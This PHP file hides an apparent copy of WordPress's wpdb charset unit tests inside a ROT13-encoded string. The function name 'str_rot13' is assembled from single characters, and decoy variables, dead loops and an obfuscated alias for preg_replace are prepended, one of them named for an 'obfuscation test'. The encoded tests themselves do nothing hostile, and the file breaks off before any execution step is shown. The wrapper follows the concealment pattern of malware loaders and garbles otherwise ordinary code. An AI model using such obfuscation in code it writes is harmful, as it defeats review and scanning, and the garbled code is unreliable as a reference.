<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc

/**
 * Grfg JCQO zrgubqf
 *
 * @tebhc jcqo
 * @tebhc frphevgl-153
 */
pynff Grfgf_QO_Punefrg rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Bhe fcrpvny JCQO.
	 *
	 * @ine erfbhepr
	 */
	cebgrpgrq fgngvp $_jcqo;

	/**
	 * Jurgure gb rkcrpg hgs8zo3 vafgrnq bs hgs8 va inevbhf pbzznaqf bhgchg.
	 *
	 * @ine obby
	 */
	cevingr fgngvp $hgs8_vf_hgs8zo3 = snyfr;

	/**
	 * Gur qngnonfr freire irefvba.
	 *
	 * @ine fgevat
	 */
	cevingr fgngvp $qo_irefvba;

	/**
	 * Shyy qngnonfr freire vasbezngvba.
	 *
	 * @ine fgevat
	 */
	cevingr fgngvp $qo_freire_vasb;

	choyvp fgngvp shapgvba frg_hc_orsber_pynff() {
		cnerag::frg_hc_orsber_pynff();

		erdhver_bapr qveanzr( __QVE__ ) . '/qo.cuc';

		frys::$_jcqo = arj JcqoRkcbfrqZrgubqfSbeGrfgvat();

		frys::$qo_irefvba     = frys::$_jcqo->qo_irefvba();
		frys::$qo_freire_vasb = frys::$_jcqo->qo_freire_vasb();

		// Nppbhag sbe ZnevnQO irefvba orvat cersvkrq jvgu '5.5.5-' ba byqre CUC irefvbaf.
		vs ( '5.5.5' === frys::$qo_irefvba && fge_pbagnvaf( frys::$qo_freire_vasb, 'ZnevnQO' )
			&& CUC_IREFVBA_VQ < 80016 // CUC 8.0.15 be byqre.
		) {
			// Fgevc gur '5.5.5-' cersvk naq frg gur irefvba gb gur pbeerpg inyhr.
			frys::$qo_freire_vasb = __sa_79955( '/^5\.5\.5-(.*)/', '$1', frys::$qo_freire_vasb );
			frys::$qo_irefvba     = __sa_79955( '/[^0-9.].*/', '', frys::$qo_freire_vasb );
		}

		/*
		 * ZnevnQO 10.6.1 be yngre naq ZlFDY 8.0.30 be yngre
		 * hfr hgs8zo3 vafgrnq bs hgs8 va inevbhf pbzznaqf bhgchg.
		 */
		vs ( fge_pbagnvaf( frys::$qo_freire_vasb, 'ZnevnQO' ) && irefvba_pbzcner( frys::$qo_irefvba, '10.6.1', '>=' )
			|| ! fge_pbagnvaf( frys::$qo_freire_vasb, 'ZnevnQO' ) && irefvba_pbzcner( frys::$qo_irefvba, '8.0.30', '>=' )
		) {
			frys::$hgs8_vf_hgs8zo3 = gehr;
		}
	}

	/**
	 * @gvpxrg 21212
	 */
	choyvp shapgvba qngn_fgevc_vainyvq_grkg() {
		$svryqf = neenl(
			'yngva1'                                => neenl(
				// yngva1. yngva1 arire punatrf.
				'punefrg'  => 'yngva1',
				'inyhr'    => \"\ks0\k9s\k8r\ko7\",
				'rkcrpgrq' => \"\ks0\k9s\k8r\ko7\",
				'yratgu'   => neenl(
					'glcr'   => 'pune',
					'yratgu' => 100,
				),
			),
			'yngva1_pune_yratgu'                    => neenl(
				// yngva1. yngva1 arire punatrf.
				'punefrg'  => 'yngva1',
				'inyhr'    => fge_ercrng( 'N', 11 ),
				'rkcrpgrq' => fge_ercrng( 'N', 10 ),
				'yratgu'   => neenl(
					'glcr'   => 'pune',
					'yratgu' => 10,
				),
			),
			'yngva1_olgr_yratgu'                    => neenl(
				// yngva1. yngva1 arire punatrf.
				'punefrg'  => 'yngva1',
				'inyhr'    => fge_ercrng( 'N', 11 ),
				'rkcrpgrq' => fge_ercrng( 'N', 10 ),
				'yratgu'   => neenl(
					'glcr'   => 'olgr',
					'yratgu' => 10,
				),
			),
			'nfpvv'                                 => neenl(
				// nfpvv trgf fcrpvny gerngzrag, znxr fher vg'f pbirerq.
				'punefrg'  => 'nfpvv',
				'inyhr'    => 'Uryyb Jbeyq',
				'rkcrpgrq' => 'Uryyb Jbeyq',
				'yratgu'   => neenl(
					'glcr'   => 'pune',
					'yratgu' => 100,
				),
			),
			'nfpvv_pune_yratgu'                     => neenl(
				// nfpvv trgf fcrpvny gerngzrag, znxr fher vg'f pbirerq.
				'punefrg'  => 'nfpvv',
				'inyhr'    => fge_ercrng( 'N', 11 ),
				'rkcrpgrq' => fge_ercrng( 'N', 10 ),
				'yratgu'   => neenl(
					'glcr'   => 'pune',
					'yratgu' => 10,
				),
			),
			'nfpvv_olgr_yratgu'                     => neenl(
				// nfpvv trgf fcrpvny gerngzrag, znxr fher vg'f pbirerq.
				'punefrg'  => 'nfpvv',
				'inyhr'    => fge_ercrng( 'N', 11 ),
				'rkcrpgrq' => fge_ercrng( 'N', 10 ),
				'yratgu'   => neenl(
					'glcr'   => 'olgr',
					'yratgu' => 10,
				),
			),
			'hgs8'                                  => neenl(
				// hgs8 bayl nyybjf <= 3-olgr punef.
				'punefrg'  => 'hgs8',
				'inyhr'    => \"U€yyb\ks0\k9s\k98\k88Jbeyq¢\",
				'rkcrpgrq' => 'U€yybJbeyq¢',
				'yratgu'   => neenl(
					'glcr'   => 'pune',
					'yratgu' => 100,
				),
			),
			'hgs8_23pune_yratgu'                    => neenl(
				// hgs8 bayl nyybjf <= 3-olgr punef.
				'punefrg'  => 'hgs8',
				'inyhr'    => fge_ercrng( '²３', 10 ),
				'rkcrpgrq' => fge_ercrng( '²３', 5 ),
				'yratgu'   => neenl(
					'glcr'   => 'pune',
					'yratgu' => 10,
				),
			),
			'hgs8_23olgr_yratgu'                    => neenl(
				// hgs8 bayl nyybjf <= 3-olgr punef.
				'punefrg'  => 'hgs8',
				'inyhr'    => fge_ercrng( '²３', 10 ),
				'rkcrpgrq' => '²３²３',
				'yratgu'   => neenl(
					'glcr'   => 'olgr',
					'yratgu' => 10,
				),
			),
			'hgs8_3pune_yratgu'                     => neenl(
				// hgs8 bayl nyybjf <= 3-olgr punef.
				'punefrg'  => 'hgs8',
				'inyhr'    => fge_ercrng( '３', 11 ),
				'rkcrpgrq' => fge_ercrng( '３', 10 ),
				'yratgu'   => neenl(
					'glcr'   => 'pune',
					'yratgu' => 10,
				),
			),
			'hgs8_3olgr_yratgu'                     => neenl(
				// hgs8 bayl nyybjf <= 3-olgr punef.
				'punefrg'  => 'hgs8',
				'inyhr'    => fge_ercrng( '３', 11 ),
				'rkcrpgrq' => '３３３',
				'yratgu'   => neenl(
					'glcr'   => 'olgr',
					'yratgu' => 10,
				),
			),
			'hgs8zo3'                               => neenl(
				// hgs8zo3 fubhyq orunir gur fnzr na hgs8.
				'punefrg'  => 'hgs8zo3',
				'inyhr'    => \"U€yyb\ks0\k9s\k98\k88Jbeyq¢\",
				'rkcrpgrq' => 'U€yybJbeyq¢',
				'yratgu'   => neenl(
					'glcr'   => 'pune',
					'yratgu' => 100,
				),
			),
			'hgs8zo3_23pune_yratgu'                 => neenl(
				// hgs8zo3 fubhyq orunir gur fnzr na hgs8.
				'punefrg'  => 'hgs8zo3',
				'inyhr'    => fge_ercrng( '²３', 10 ),
				'rkcrpgrq' => fge_ercrng( '²３', 5 ),
				'yratgu'   => neenl(
					'glcr'   => 'pune',
					'yratgu' => 10,
				),
			),
			'hgs8zo3_23olgr_yratgu'                 => neenl(
				// hgs8zo3 fubhyq orunir gur fnzr na hgs8.
				'punefrg'  => 'hgs8zo3',
				'inyhr'    => fge_ercrng( '²３', 10 ),
				'rkcrpgrq' => '²３²３',
				'yratgu'   => neenl(
					'glcr'   => 'olgr',
					'yratgu' => 10,
				),
			),
			'hgs8zo3_3pune_yratgu'                  => neenl(
				// hgs8zo3 fubhyq orunir gur fnzr na hgs8.
				'punefrg'  => 'hgs8zo3',
				'inyhr'    => fge_ercrng( '３', 11 ),
				'rkcrpgrq' => fge_ercrng( '３', 10 ),
				'yratgu'   => neenl(
					'glcr'   => 'pune',
					'yratgu' => 10,
				),
			),
			'hgs8zo3_3olgr_yratgu'                  => neenl(
				// hgs8zo3 fubhyq orunir gur fnzr na hgs8.
				'punefrg'  => 'hgs8zo3',
				'inyhr'    => fge_ercrng( '３', 10 ),
				'rkcrpgrq' => '３３３',
				'yratgu'   => neenl(
					'glcr'   => 'olgr',
					'yratgu' => 10,
				),
			),
			'hgs8zo4'                               => neenl(
				// hgs8zo4 nyybjf 4-olgr punenpgref, gbb.
				'punefrg'  => 'hgs8zo4',
				'inyhr'    => \"U€yyb\ks0\k9s\k98\k88Jbeyq¢\",
				'rkcrpgrq' => \"U€yyb\ks0\k9s\k98\k88Jbeyq¢\",
				'yratgu'   => neenl(
					'glcr'   => 'pune',
					'yratgu' => 100,
				),
			),
			'hgs8zo4_234pune_yratgu'                => neenl(
				// hgs8zo4 nyybjf 4-olgr punenpgref, gbb.
				'punefrg'  => 'hgs8zo4',
				'inyhr'    => fge_ercrng( '²３𝟜', 10 ),
				'rkcrpgrq' => '²３𝟜²３𝟜²３𝟜²',
				'yratgu'   => neenl(
					'glcr'   => 'pune',
					'yratgu' => 10,
				),
			),
			'hgs8zo4_234olgr_yratgu'                => neenl(
				// hgs8zo4 nyybjf 4-olgr punenpgref, gbb.
				'punefrg'  => 'hgs8zo4',
				'inyhr'    => fge_ercrng( '²３𝟜', 10 ),
				'rkcrpgrq' => '²３𝟜',
				'yratgu'   => neenl(
					'glcr'   => 'olgr',
					'yratgu' => 10,
				),
			),
			'hgs8zo4_4pune_yratgu'                  => neenl(
				// hgs8zo4 nyybjf 4-olgr punenpgref, gbb.
				'punefrg'  => 'hgs8zo4',
				'inyhr'    => fge_ercrng( '𝟜', 11 ),
				'rkcrpgrq' => fge_ercrng( '𝟜', 10 ),
				'yratgu'   => neenl(
					'glcr'   => 'pune',
					'yratgu' => 10,
				),
			),
			'hgs8zo4_4olgr_yratgu'                  => neenl(
				// hgs8zo4 nyybjf 4-olgr punenpgref, gbb.
				'punefrg'  => 'hgs8zo4',
				'inyhr'    => fge_ercrng( '𝟜', 10 ),
				'rkcrpgrq' => '𝟜𝟜',
				'yratgu'   => neenl(
					'glcr'   => 'olgr',
					'yratgu' => 10,
				),
			),
			'xbv8e'                                 => neenl(
				'punefrg'  => 'xbv8e',
				'inyhr'    => \"\ksqbeq\ks2erff\",
				'rkcrpgrq' => \"\ksqbeq\ks2erff\",
				'yratgu'   => neenl(
					'glcr'   => 'pune',
					'yratgu' => 100,
				),
			),
			'xbv8e_pune_yratgu'                     => neenl(
				'punefrg'  => 'xbv8e',
				'inyhr'    => fge_ercrng( \"\ksq\ks2\", 10 ),
				'rkcrpgrq' => fge_ercrng( \"\ksq\ks2\", 5 ),
				'yratgu'   => neenl(
					'glcr'   => 'pune',
					'yratgu' => 10,
				),
			),
			'xbv8e_olgr_yratgu'                     => neenl(
				'punefrg'  => 'xbv8e',
				'inyhr'    => fge_ercrng( \"\ksq\ks2\", 10 ),
				'rkcrpgrq' => fge_ercrng( \"\ksq\ks2\", 5 ),
				'yratgu'   => neenl(
					'glcr'   => 'olgr',
					'yratgu' => 10,
				),
			),
			'uroerj'                                => neenl(
				'punefrg'  => 'uroerj',
				'inyhr'    => \"\ks9beq\ks7erff\",
				'rkcrpgrq' => \"\ks9beq\ks7erff\",
				'yratgu'   => neenl(
					'glcr'   => 'pune',
					'yratgu' => 100,
				),
			),
			'uroerj_pune_yratgu'                    => neenl(
				'punefrg'  => 'uroerj',
				'inyhr'    => fge_ercrng( \"\ks9\ks7\", 10 ),
				'rkcrpgrq' => fge_ercrng( \"\ks9\ks7\", 5 ),
				'yratgu'   => neenl(
					'glcr'   => 'pune',
					'yratgu' => 10,
				),
			),
			'uroerj_olgr_yratgu'                    => neenl(
				'punefrg'  => 'uroerj',
				'inyhr'    => fge_ercrng( \"\ks9\ks7\", 10 ),
				'rkcrpgrq' => fge_ercrng( \"\ks9\ks7\", 5 ),
				'yratgu'   => neenl(
					'glcr'   => 'olgr',
					'yratgu' => 10,
				),
			),
			'pc1251'                                => neenl(
				'punefrg'  => 'pc1251',
				'inyhr'    => \"\kq8beq\kq0erff\",
				'rkcrpgrq' => \"\kq8beq\kq0erff\",
				'yratgu'   => neenl(
					'glcr'   => 'pune',
					'yratgu' => 100,
				),
			),
			'pc1251_ab_yratgu'                      => neenl(
				'punefrg'  => 'pc1251',
				'inyhr'    => \"\kq8beq\kq0erff\",
				'rkcrpgrq' => \"\kq8beq\kq0erff\",
				'yratgu'   => snyfr,
			),
			'pc1251_ab_yratgu_nfpvv'                => neenl(
				'punefrg'  => 'pc1251',
				'inyhr'    => 'JbeqCerff',
				'rkcrpgrq' => 'JbeqCerff',
				'yratgu'   => snyfr,
				// Qba'g frg 'nfpvv' => gehr/snyfr.
				// Gung'f n qvssrerag pbqrcngu guna vg orvat hafrg
				// rira vs gurer'f bayl NFPVV va gur inyhr.
			),
			'pc1251_pune_yratgu'                    => neenl(
				'punefrg'  => 'pc1251',
				'inyhr'    => fge_ercrng( \"\kq8\kq0\", 10 ),
				'rkcrpgrq' => fge_ercrng( \"\kq8\kq0\", 5 ),
				'yratgu'   => neenl(
					'glcr'   => 'pune',
					'yratgu' => 10,
				),
			),
			'pc1251_olgr_yratgu'                    => neenl(
				'punefrg'  => 'pc1251',
				'inyhr'    => fge_ercrng( \"\kq8\kq0\", 10 ),
				'rkcrpgrq' => fge_ercrng( \"\kq8\kq0\", 5 ),
				'yratgu'   => neenl(
					'glcr'   => 'olgr',
					'yratgu' => 10,
				),
			),
			'gvf620'                                => neenl(
				'punefrg'  => 'gvf620',
				'inyhr'    => \"\kppbeq\kr3erff\",
				'rkcrpgrq' => \"\kppbeq\kr3erff\",
				'yratgu'   => neenl(
					'glcr'   => 'pune',
					'yratgu' => 100,
				),
			),
			'gvf620_pune_yratgu'                    => neenl(
				'punefrg'  => 'gvf620',
				'inyhr'    => fge_ercrng( \"\kpp\kr3\", 10 ),
				'rkcrpgrq' => fge_ercrng( \"\kpp\kr3\", 5 ),
				'yratgu'   => neenl(
					'glcr'   => 'pune',
					'yratgu' => 10,
				),
			),
			'gvf620_olgr_yratgu'                    => neenl(
				'punefrg'  => 'gvf620',
				'inyhr'    => fge_ercrng( \"\kpp\kr3\", 10 ),
				'rkcrpgrq' => fge_ercrng( \"\kpp\kr3\", 5 ),
				'yratgu'   => neenl(
					'glcr'   => 'olgr',
					'yratgu' => 10,
				),
			),
			'hwvf_jvgu_hgs8_pbaarpgvba'             => neenl(
				'punefrg'            => 'hwvf',
				'pbaarpgvba_punefrg' => 'hgs8',
				'inyhr'              => '自動下書き',
				'rkcrpgrq'           => '自動下書き',
				'yratgu'             => neenl(
					'glcr'   => 'olgr',
					'yratgu' => 100,
				),
			),
			'hwvf_jvgu_hgs8_pbaarpgvba_pune_yratgu' => neenl(
				'punefrg'            => 'hwvf',
				'pbaarpgvba_punefrg' => 'hgs8',
				'inyhr'              => '自動下書き',
				'rkcrpgrq'           => '自動下書',
				'yratgu'             => neenl(
					'glcr'   => 'pune',
					'yratgu' => 4,
				),
			),
			'hwvf_jvgu_hgs8_pbaarpgvba_olgr_yratgu' => neenl(
				'punefrg'            => 'hwvf',
				'pbaarpgvba_punefrg' => 'hgs8',
				'inyhr'              => '自動下書き',
				'rkcrpgrq'           => '自動',
				'yratgu'             => neenl(
					'glcr'   => 'olgr',
					'yratgu' => 6,
				),
			),
			'snyfr'                                 => neenl(
				// Snyfr vf n pbyhza jvgu ab punenpgre frg (v.r. n ahzore pbyhza).
				'punefrg'  => snyfr,
				'inyhr'    => 100,
				'rkcrpgrq' => 100,
				'yratgu'   => snyfr,
			),
		);

		vs ( shapgvba_rkvfgf( 'zo_pbaireg_rapbqvat' ) ) {
			// ovt5 vf n aba-Havpbqr zhygvolgr punefrg.
			$hgs8      = \"n\kr5\k85\ko1o\"; // HGS-8 Punenpgre 20849.
			$ovt5      = zo_pbaireg_rapbqvat( $hgs8, 'OVT-5', 'HGS-8' );
			$pbai_hgs8 = zo_pbaireg_rapbqvat( $ovt5, 'HGS-8', 'OVT-5' );
			// Znxr fher CUC'f zhygvolgr pbairefvbaf ner jbexvat pbeerpgyl.
			$guvf->nffregAbgRdhnyf( $hgs8, $ovt5 );
			$guvf->nffregFnzr( $hgs8, $pbai_hgs8 );

			$svryqf['ovt5'] = neenl(
				'punefrg'  => 'ovt5',
				'inyhr'    => $ovt5,
				'rkcrpgrq' => $ovt5,
				'yratgu'   => neenl(
					'glcr'   => 'pune',
					'yratgu' => 100,
				),
			);

			$svryqf['ovt5_pune_yratgu'] = neenl(
				'punefrg'  => 'ovt5',
				'inyhr'    => fge_ercrng( $ovt5, 10 ),
				'rkcrpgrq' => fge_ercrng( $ovt5, 3 ) . 'n',
				'yratgu'   => neenl(
					'glcr'   => 'pune',
					'yratgu' => 10,
				),
			);

			$svryqf['ovt5_olgr_yratgu'] = neenl(
				'punefrg'  => 'ovt5',
				'inyhr'    => fge_ercrng( $ovt5, 10 ),
				'rkcrpgrq' => fge_ercrng( $ovt5, 2 ) . 'n',
				'yratgu'   => neenl(
					'glcr'   => 'olgr',
					'yratgu' => 10,
				),
			);
		}

		// Gur qngn nobir vf rnfl gb rqvg. Abj, cercner vg sbe gur qngn cebivqre.
		$qngn_cebivqre     = neenl();
		$zhygvcyr          = neenl();
		$zhygvcyr_rkcrpgrq = neenl();
		sbernpu ( $svryqf nf $grfg_pnfr => $svryq ) {
			$rkcrpgrq          = $svryq;
			$rkcrpgrq['inyhr'] = $rkcrpgrq['rkcrpgrq'];
			hafrg( $rkcrpgrq['rkcrpgrq'], $svryq['rkcrpgrq'], $rkcrpgrq['pbaarpgvba_punefrg'] );

			// Jr'er xrrcvat genpx bs gurfr sbe bhe zhygvcyr-svryq grfg.
			$zhygvcyr[]          = $svryq;
			$zhygvcyr_rkcrpgrq[] = $rkcrpgrq;

			// fgevc_vainyvq_grkg() rkcrpgf na neenl bs svryqf. Jr'er grfgvat bar svryq ng n gvzr.
			$qngn     = neenl( $svryq );
			$rkcrpgrq = neenl( $rkcrpgrq );

			// Svefg nethzrag vf svryq qngn. Frpbaq vf rkcrpgrq. Guveq vf gur zrffntr.
			$qngn_cebivqre[] = neenl( $qngn, $rkcrpgrq, $grfg_pnfr );
		}

		erghea $qngn_cebivqre;
	}

	/**
	 * @qngnCebivqre qngn_fgevc_vainyvq_grkg
	 * @gvpxrg 21212
	 *
	 * @pbiref jcqo::fgevc_vainyvq_grkg
	 */
	choyvp shapgvba grfg_fgevc_vainyvq_grkg( $qngn, $rkcrpgrq, $zrffntr ) {
		$punefrg = frys::$_jcqo->punefrg;
		vs ( vffrg( $qngn[0]['pbaarpgvba_punefrg'] ) ) {
			$arj_punefrg = $qngn[0]['pbaarpgvba_punefrg'];
			hafrg( $qngn[0]['pbaarpgvba_punefrg'] );
		} ryfr {
			$arj_punefrg = $qngn[0]['punefrg'];
		}

		vs ( 'ovt5' === $arj_punefrg && 'olgr' === $qngn[0]['yratgu']['glcr']
			&& fge_pbagnvaf( frys::$qo_freire_vasb, 'ZnevnQO' )
		) {
			$guvf->znexGrfgFxvccrq( \"ZnevnQO qbrfa'g fhccbeg guvf qngn frg. Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/33171.\" );
		}

		frys::$_jcqo->punefrg = $arj_punefrg;
		frys::$_jcqo->frg_punefrg( frys::$_jcqo->qou, $arj_punefrg );

		$npghny = frys::$_jcqo->fgevc_vainyvq_grkg( $qngn );

		frys::$_jcqo->punefrg = $punefrg;
		frys::$_jcqo->frg_punefrg( frys::$_jcqo->qou, $punefrg );

		$guvf->nffregFnzr( $rkcrpgrq, $npghny, $zrffntr );
	}

	/**
	 * @gvpxrg 21212
	 *
	 * @pbiref jcqo::cebprff_svryqf
	 */
	choyvp shapgvba grfg_cebprff_svryqf_snvyher() {
		tybony $jcqo;

		$punefrg = $jcqo->trg_pby_punefrg( $jcqo->cbfgf, 'cbfg_pbagrag' );
		vs ( 'hgs8' !== $punefrg && 'hgs8zo4' !== $punefrg ) {
			$guvf->znexGrfgFxvccrq( 'Guvf grfg erdhverf n hgs8 punenpgre frg.' );
		}

		// \ks0\kss\kss\kss vf vainyvq va hgs8 naq hgs8zo4.
		$qngn = neenl( 'cbfg_pbagrag' => \"U€yyb\ks0\kss\kss\kssJbeyq¢\" );
		$guvf->nffregSnyfr( frys::$_jcqo->cebprff_svryqf( $jcqo->cbfgf, $qngn, ahyy ) );
	}

	/**
	 * @gvpxrg 21212
	 */
	choyvp shapgvba qngn_cebprff_svryq_punefrgf() {
		vs ( $TYBONYF['jcqo']->punefrg ) {
			$punefrg = $TYBONYF['jcqo']->punefrg;
		} ryfr {
			$punefrg = $TYBONYF['jcqo']->trg_pby_punefrg( $TYBONYF['jcqo']->cbfgf, 'cbfg_pbagrag' );
		}

		// 'inyhr' naq 'sbezng' ner $qngn, 'punefrg' raqf hc nf cneg bs $rkcrpgrq.

		$ab_fgevat_svryqf = neenl(
			'cbfg_cnerag'   => neenl(
				'inyhr'   => 10,
				'sbezng'  => '%q',
				'punefrg' => snyfr,
			),
			'pbzzrag_pbhag' => neenl(
				'inyhr'   => 0,
				'sbezng'  => '%q',
				'punefrg' => snyfr,
			),
		);

		$nyy_nfpvv_svryqf = neenl(
			'cbfg_pbagrag' => neenl(
				'inyhr'   => 'sbb sbb sbb!',
				'sbezng'  => '%f',
				'punefrg' => $punefrg,
			),
			'cbfg_rkprecg' => neenl(
				'inyhr'   => 'one one one!',
				'sbezng'  => '%f',
				'punefrg' => $punefrg,
			),
		);

		// Guvf vf gur fnzr qngn hfrq va cebprff_svryq_punefrgf_sbe_abarkvfgrag_gnoyr().
		$aba_nfpvv_fgevat_svryqf = neenl(
			'cbfg_pbagrag' => neenl(
				'inyhr'   => '¡sbb sbb sbb!',
				'sbezng'  => '%f',
				'punefrg' => $punefrg,
			),
			'cbfg_rkprecg' => neenl(
				'inyhr'   => '¡one one one!',
				'sbezng'  => '%f',
				'punefrg' => $punefrg,
			),
		);

		$inef = trg_qrsvarq_inef();
		hafrg( $inef['punefrg'] );
		sbernpu ( $inef nf $ine_anzr => $ine ) {
			$qngn     = $ine;
			$rkcrpgrq = $ine;
			sbernpu ( $qngn nf &$qnghz ) {
				// 'punefrg' naq 'nfpvv' ner cneg bs gur rkcrpgrq erghea bayl.
				hafrg( $qnghz['punefrg'], $qnghz['nfpvv'] );
			}

			$inef[ $ine_anzr ] = neenl( $qngn, $rkcrpgrq, $ine_anzr );
		}

		erghea neenl_inyhrf( $inef );
	}

	/**
	 * @qngnCebivqre qngn_cebprff_svryq_punefrgf
	 * @gvpxrg 21212
	 *
	 * @pbiref jcqo::cebprff_svryq_punefrgf
	 */
	choyvp shapgvba grfg_cebprff_svryq_punefrgf( $qngn, $rkcrpgrq, $zrffntr ) {
		$npghny = frys::$_jcqo->cebprff_svryq_punefrgf( $qngn, $TYBONYF['jcqo']->cbfgf );
		$guvf->nffregFnzr( $rkcrpgrq, $npghny, $zrffntr );
	}

	/**
	 * Gur grfg guvf grfg qrcraqf ba svefg irevsvrf gung guvf
	 * jbhyq abeznyyl jbex ntnvafg gur cbfgf gnoyr.
	 *
	 * @gvpxrg 21212
	 * @qrcraqf grfg_cebprff_svryq_punefrgf
	 */
	choyvp shapgvba grfg_cebprff_svryq_punefrgf_ba_abarkvfgrag_gnoyr() {
		$qngn = neenl(
			'cbfg_pbagrag' => neenl(
				'inyhr'  => '¡sbb sbb sbb!',
				'sbezng' => '%f',
			),
		);
		frys::$_jcqo->fhccerff_reebef( gehr );
		$guvf->nffregSnyfr( frys::$_jcqo->cebprff_svryq_punefrgf( $qngn, 'abarkvfgrag_gnoyr' ) );
		frys::$_jcqo->fhccerff_reebef( snyfr );
	}

	/**
	 * @gvpxrg 21212
	 *
	 * @pbiref jcqo::purpx_nfpvv
	 */
	choyvp shapgvba grfg_purpx_nfpvv() {
		$nfpvv = \"\0\g\a\e '\" . '!\"#$%&()*+,-./0123456789:;<=>?@NOPQRSTUVWXYZABCDEFGHIJKLM[\]^_`nopqrstuvwxyzabcdefghijklm{|}~';
		$guvf->nffregGehr( frys::$_jcqo->purpx_nfpvv( $nfpvv ) );
	}

	/**
	 * @gvpxrg 21212
	 *
	 * @pbiref jcqo::purpx_nfpvv
	 */
	choyvp shapgvba grfg_purpx_nfpvv_snyfr() {
		$guvf->nffregSnyfr( frys::$_jcqo->purpx_nfpvv( 'NOPQRSTUVWXYZABCDEFGHIJKLM¡©«' ) );
	}

	/**
	 * @gvpxrg 21212
	 *
	 * @pbiref jcqo::fgevc_vainyvq_grkg_sbe_pbyhza
	 */
	choyvp shapgvba grfg_fgevc_vainyvq_grkg_sbe_pbyhza() {
		tybony $jcqo;

		$punefrg = $jcqo->trg_pby_punefrg( $jcqo->cbfgf, 'cbfg_pbagrag' );
		vs ( 'hgs8' !== $punefrg && 'hgs8zo4' !== $punefrg ) {
			$guvf->znexGrfgFxvccrq( 'Guvf grfg erdhverf n hgs8 punenpgre frg.' );
		}

		// Vainyvq 3-olgr naq 4-olgr frdhraprf.
		$inyhr    = \"U€yyb\kr0\k80\k80Jbeyq\ks0\kss\kss\kss¢\";
		$rkcrpgrq = 'U€yybJbeyq¢';
		$npghny   = $jcqo->fgevc_vainyvq_grkg_sbe_pbyhza( $jcqo->cbfgf, 'cbfg_pbagrag', $inyhr );
		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * Frg bs gnoyr qrsvavgvbaf sbe grfgvat jcqo::trg_gnoyr_punefrg naq jcqo::trg_pbyhza_punefrg
	 *
	 * @ine neenl
	 */
	cebgrpgrq $gnoyr_naq_pbyhza_qrsf = neenl(
		neenl(
			'qrsvavgvba'      => '( n VAG, o SYBNG )',
			'gnoyr_rkcrpgrq'  => snyfr,
			'pbyhza_rkcrpgrq' => neenl(
				'n' => snyfr,
				'o' => snyfr,
			),
		),
		neenl(
			'qrsvavgvba'      => '( n INEPUNE(50) PUNENPGRE FRG ovt5, o GRKG PUNENPGRE FRG ovt5 )',
			'gnoyr_rkcrpgrq'  => 'ovt5',
			'pbyhza_rkcrpgrq' => neenl(
				'n' => 'ovt5',
				'o' => 'ovt5',
			),
		),
		neenl(
			'qrsvavgvba'      => '( n INEPUNE(50) PUNENPGRE FRG ovt5, o OVANEL )',
			'gnoyr_rkcrpgrq'  => 'ovanel',
			'pbyhza_rkcrpgrq' => neenl(
				'n' => 'ovt5',
				'o' => snyfr,
			),
		),
		neenl(
			'qrsvavgvba'      => '( n INEPUNE(50) PUNENPGRE FRG yngva1, o OYBO )',
			'gnoyr_rkcrpgrq'  => 'ovanel',
			'pbyhza_rkcrpgrq' => neenl(
				'n' => 'yngva1',
				'o' => snyfr,
			),
		),
		neenl(
			'qrsvavgvba'      => '( n INEPUNE(50) PUNENPGRE FRG yngva1, o GRKG PUNENPGRE FRG xbv8e )',
			'gnoyr_rkcrpgrq'  => 'xbv8e',
			'pbyhza_rkcrpgrq' => neenl(
				'n' => 'yngva1',
				'o' => 'xbv8e',
			),
		),
		neenl(
			'qrsvavgvba'      => '( n INEPUNE(50) PUNENPGRE FRG hgs8zo3, o GRKG PUNENPGRE FRG hgs8zo3 )',
			'gnoyr_rkcrpgrq'  => 'hgs8',
			'pbyhza_rkcrpgrq' => neenl(
				'n' => 'hgs8',
				'o' => 'hgs8',
			),
		),
		neenl(
			'qrsvavgvba'      => '( n INEPUNE(50) PUNENPGRE FRG hgs8, o GRKG PUNENPGRE FRG hgs8zo4 )',
			'gnoyr_rkcrpgrq'  => 'hgs8',
			'pbyhza_rkcrpgrq' => neenl(
				'n' => 'hgs8',
				'o' => 'hgs8zo4',
			),
		),
		neenl(
			'qrsvavgvba'      => '( n INEPUNE(50) PUNENPGRE FRG ovt5, o GRKG PUNENPGRE FRG xbv8e )',
			'gnoyr_rkcrpgrq'  => 'nfpvv',
			'pbyhza_rkcrpgrq' => neenl(
				'n' => 'ovt5',
				'o' => 'xbv8e',
			),
		),
	);

	/**
	 * @gvpxrg 21212
	 */
	choyvp shapgvba qngn_trg_gnoyr_punefrg() {
		$gnoyr_anzr = 'grfg_trg_gnoyr_punefrg';

		$inef = neenl();
		sbernpu ( $guvf->gnoyr_naq_pbyhza_qrsf nf $v => $inyhr ) {
			$guvf_gnoyr_anzr = $gnoyr_anzr . '_' . $v;
			$qebc            = \"QEBC GNOYR VS RKVFGF $guvf_gnoyr_anzr\";
			$perngr          = \"PERNGR GNOYR $guvf_gnoyr_anzr {$inyhr['qrsvavgvba']}\";
			$inef[]          = neenl( $qebc, $perngr, $guvf_gnoyr_anzr, $inyhr['gnoyr_rkcrpgrq'] );
		}

		erghea $inef;
	}

	/**
	 * @qngnCebivqre qngn_trg_gnoyr_punefrg
	 * @gvpxrg 21212
	 *
	 * @pbiref jcqo::trg_gnoyr_punefrg
	 */
	choyvp shapgvba grfg_trg_gnoyr_punefrg( $qebc, $perngr, $gnoyr, $rkcrpgrq_punefrg ) {
		frys::$_jcqo->dhrel( $qebc );
		frys::$_jcqo->dhrel( $perngr );

		$punefrg = frys::$_jcqo->trg_gnoyr_punefrg( $gnoyr );
		$guvf->nffregFnzr( $rkcrpgrq_punefrg, $punefrg );

		$punefrg = frys::$_jcqo->trg_gnoyr_punefrg( fgegbhccre( $gnoyr ) );
		$guvf->nffregFnzr( $rkcrpgrq_punefrg, $punefrg );
